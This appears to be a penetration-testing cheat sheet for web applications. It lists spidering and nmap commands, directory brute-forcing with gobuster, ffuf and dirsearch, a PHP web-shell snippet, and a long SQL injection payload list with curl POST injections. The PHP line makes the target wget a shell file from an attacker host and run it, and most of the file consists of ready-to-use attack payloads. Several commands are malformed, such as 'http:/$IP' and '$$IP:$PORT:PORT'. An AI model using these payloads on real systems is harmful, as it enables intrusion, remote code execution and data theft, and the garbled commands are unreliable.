

* ### Web Applications

> #### spider
```
wget --spider -r http://$IP:$PORT 2>&1 | grep '^--' | awk '{ print $3 }' | grep -v '\.\(css\|js\|png\|gif\|jpg\)$' > urls.wget
```

```
sudo nmap --script=http-title
sudo nmap --script=http-headers
sudo nmap --script=http-enum
```
>  #### Browsing
```
robots.txt
# when robots.txt is accessable only by bot scans
curl -A "'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)')" http://website/robots.txt
# wappalyzer
# javascript
# view source
# firefox / chrome Dev Tools
# whatweb
```
> #### Scanning
```
gobuster dir --url http://$IP:$PORT../.. -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x .php,.txt,.aspx -o gobuster.out
dirb http://$IP:$PORT/ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -o dirb.txt
dirbuster
wpscan
nikto -C all -host http://$IP:$PORT -o nikto.out
wfuzz -v -c -z file,/usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt  --hc 404 -u http://$IP:$PORT/FUZZ -R2
ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -t 1000 -u http:/$IP:$PORT/FUZZ -recursion --recursion-depth 3 -c -v -o ffuf.out

dirsearch -u http://$IP:$PORT -r -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -o /home/kali/pentest/IP/dirsearch.txt
dirsearch -e php,html,js -u http://$IP:$PORT -r

```
> burp

```
# php wrapper
<?php  $output = shell_exec(' ....'); echo "<pre>$output</pre>";  ?>
GET /thefile.php?variable=php://input

<?php system("wget <http://$IP:$PORT../my_shell.txt -O /tmp/my_shell.php;php /tmp/my_shell.php");?>
GET /THE/PATH/TO/VULN.php?vuln=../../../../../../../../../path/to/your/new/database/something.php

```

> #### SQL injection
[deeper detail](sql_injection.md)

```
/?q=1
/?q=1'
/?q=1"
/?q=[1]
/?q=1
/?q=1`
/?q=1\
/?q=1/*'*/
/?q=1/*!1111'*/
/?q=1 ' | | ' asd ' | | '
/?q=1'  or  '1'='1
/?q=1  or  1=1
/?q= 'or' '='
' or '1' ='1' --
' or '1'='1

searchterm OR 1=1-
-'
' '
'&'
'^'
'*'
' or ''-'
' or '' '
' or ''&'
' or ''^'
' or ''*'
OR 3=3;#
OR 2=2 LIMIT 1;
OR 'a'='a
OR 1=1 --+
https://TARGET.COM/login.asp?Username='%20or%20'1'='1&Password='%20or%20'1'='1
https://TARGET.COM/list_report.aspx?number=001%20UNION%20ALL%201,1,'a',1,1,1%20FROM%20users;--
http://TARGET.COM/index.php?id=2%20union%20all%20select%201,%202,%20@@version

curl -i -s -k -X $'POST' \\n    -H $'Host: $$IP:$PORT:PORT' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Content-Type: application/x-www-form-urlencoded' -H $'Content-Length: 26' -H $'Origin: http://10.11.1.128:4167' -H $'Connection: close' -H $'Referer: http://$$IP:$PORT:PORT/search.asp' -H $'Upgrade-Insecure-Requests: 1' \\n    -b $'SESSIONCOOKIE=COOOOOKIE' \\n    --data-binary $'\x0d\x0aartist=id=1 \'or\' 1 \'=\' 1' \\n    $'http://$$IP:$PORT:PORT/search.asp'

curl -i -s -k -X $'POST' -H $'Host: $$IP:$PORT:PORT' -H $'Origin: http://$$IP:$PORT:PORT' -H $'Connection: close' -H $'Referer: http://$$IP:$PORT:PORT/search.asp' -H $'Upgrade-Insecure-Requests: 1' -b $'ASPSESSIONIDQSQTTSQD=HAGFDELAABCPGKKBCNMKIFHI' --data-binary $'song=id=1 \'or\' 1 \'=\' 1' $'http://$$IP:$PORT:PORT/search.asp'
```
